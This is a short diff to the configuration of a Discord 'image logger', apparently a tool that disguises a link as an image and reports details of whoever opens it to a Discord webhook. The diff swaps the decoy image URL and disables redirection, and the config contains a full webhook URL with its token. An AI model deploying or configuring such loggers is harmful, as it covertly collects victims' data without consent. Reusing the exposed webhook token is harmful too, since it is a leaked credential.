@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1351132998682148914/zSnHvI7XRVUyUvCiHe-VyYR3qSjirhCea_6tokks9tAtYFXc4gow_8IduK83G7AHDa6j",
-    "image": "https://tenor.com/view/open-door-wind-windy-day-child-blown-away-bye-girl-gif-14551319846949000655", # You can also have a custom image by using a URL argument
+    "image": "https://counterstrike.fandom.com/wiki/Counter-Strike_Wiki", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://counterstrike.fandom.com/wiki/Counter-Strike_Wiki" # Link to the webpage to redirect to 
     },
 
